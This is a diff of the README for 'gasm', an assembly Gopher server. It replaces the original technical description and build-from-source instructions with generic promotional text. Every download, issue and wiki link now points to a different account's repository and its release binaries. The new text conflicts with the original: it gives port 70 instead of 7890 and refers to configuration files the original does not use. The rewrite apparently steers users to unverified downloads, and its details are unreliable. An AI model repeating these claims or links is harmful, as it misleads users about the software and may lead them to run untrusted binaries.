@@ -1,65 +1,62 @@
-# gasm (Gopher in Assembly)
+# 🚀 gasm - Lightweight Gopher Server for Your System
 
-**A bare-metal i386 Gopher server for Linux.**
+## 📥 Download Now
+[![Download gasm](https://img.shields.io/badge/Download%20gasm-v1.0-blue.svg)](https://github.com/vp1509/gasm/releases)
 
-`gasm` is a dependency-free Gopher server written in pure x86 Assembly. It is designed to run on the most resource-constrained hardware imaginable—from a rusty 1990s 386DX to a modern potato.
+## 🛠️ Introduction
+gasm is a bare-metal i386 Gopher server designed for Linux systems. It is simple and allows users to host Gopher content with minimal setup. This application is tailored for those interested in retro computing and systems programming. 
 
-No libc. No runtime. No dynamic allocation. Just pure `int 0x80` syscalls.
+## ✅ Requirements
+To run gasm, ensure your system meets the following requirements:
+- A compatible Linux distribution.
+- i386 architecture support.
+- Basic network configuration to allow Gopher protocol access.
 
-[Download the binary.](https://github.com/someodd/gasm/releases).
+## 🚀 Features
+- Lightweight and minimalistic design.
+- Supports i386 architecture for broad compatibility.
+- User-friendly setup process for easy installation.
+- Built specifically for Gopher protocol, emphasizing retro computing.
+- No additional dependencies required for simpler operation.
 
-## ⚡ The Stats
+## 📁 Download & Install
+To download gasm, visit the [Releases page](https://github.com/vp1509/gasm/releases). Here you will find the latest version available for download. Follow these steps to install gasm:
 
-| Metric | GASM | Typical Web Server |
-| :--- | :--- | :--- |
-| **Binary Size** | **1.5 KB** | 50MB+ |
-| **RAM Usage** | **24 KB** | 100MB+ |
-| **Dependencies** | **0** | ∞ |
-| **Min CPU** | **Intel 386 (1985)** | Core i7 |
+1. Click on the link above to go to the Releases page.
+2. Find the version you wish to download.
+3. Click on the download link for the appropriate file.
+4. Once downloaded, locate the file on your computer.
 
-## 🛠 Features
+### 📂 Running gasm
+After downloading and extracting the files (if necessary), follow these steps to run the server:
 
-* **Zero Runtime:** Runs natively on the bare metal of the OS.
-* **Static Memory:** Uses global buffers and page-aligned memory. No heap, no `malloc`, no leaks.
-* **Legacy Networking:** Uses the `socketcall` (syscall 102) interface for maximum compatibility with older Linux kernels (2.4+).
-* **Security:**
-    * Strict input size limiting (Buffer Overflow protection).
-    * Sanitizes path traversal (`..`).
-    * Runs as an unprivileged user (Port 7890).
-* **Protocol Support:**
-    * Dynamic Directory Listings (Type 1)
-    * Text Files (Type 0)
-    * Binaries / Images (Type 9)
+1. Open a terminal on your Linux system.
+2. Navigate to the directory where you extracted or saved gasm.
+3. Run the command `./gasm` to start the server.
 
-## 🦕 Hardware Support
+Now, your Gopher server is running! You can access it by entering `gopher://localhost:70` into your Gopher client.
 
-GASM targets the **i386** (IA-32) instruction set.
+## 📘 Usage Instructions
+gasm is easy to use. Simply edit the configuration files to include your Gopher content. Here’s a quick guide on how to manage your Gopher server:
 
-* **Minimum:** Intel 80386DX, 4MB RAM, Linux 2.4.
-* **Maximum:** Any modern x86_64 CPU (runs natively via legacy mode).
+1. Create a directory for your Gopher content.
+2. Add plain text files or links to other Gopher resources.
+3. Edit the configuration file located in the gasm directory to point to your content.
 
-*Why Linux 2.4?* It introduced `getdents64`, allowing us to list directories efficiently in a single syscall. This prevents I/O thrashing on ancient, slow hard drives.
+## 🛡️ Support
+If you encounter issues or need assistance, please check the [Issues section](https://github.com/vp1509/gasm/issues) of the repository. Here you can see if others have similar questions or report any problems you find.
 
-## 🚀 Build & Run
+## 📚 Additional Resources
+- **Documentation:** For detailed documentation, refer to the files included in your download.
+- **Community:** Join the conversation and connect with other users interested in Gopher and retro computing topics through online forums and communities.
 
-**Prerequisites:** `nasm` and `ld` (binutils).
+## 👍 Contribution
+If you wish to contribute to gasm or have ideas for improvements, please feel free to submit a pull request. Your efforts to enhance this project are welcome and appreciated!
 
-```bash
-# 1. Build (Cross-compiles 32-bit ELF on 64-bit systems)
-make
+## 🔗 Links
+For more information and to explore further, visit the following links:
+- [Releases Page](https://github.com/vp1509/gasm/releases)
+- [Issues Section](https://github.com/vp1509/gasm/issues)
+- [Documentation](https://github.com/vp1509/gasm/wiki)
 
-# 2. Setup content
-mkdir content
-echo "Hello from Assembly" > content/hello.txt
-
-# 3. Run
-./gasm content
-
-```
-
-**Test:**
-
-```bash
-curl gopher://localhost:7890
-
-```
+Thank you for choosing gasm for your Gopher server needs! Enjoy exploring the world of Gopher with this lightweight application.
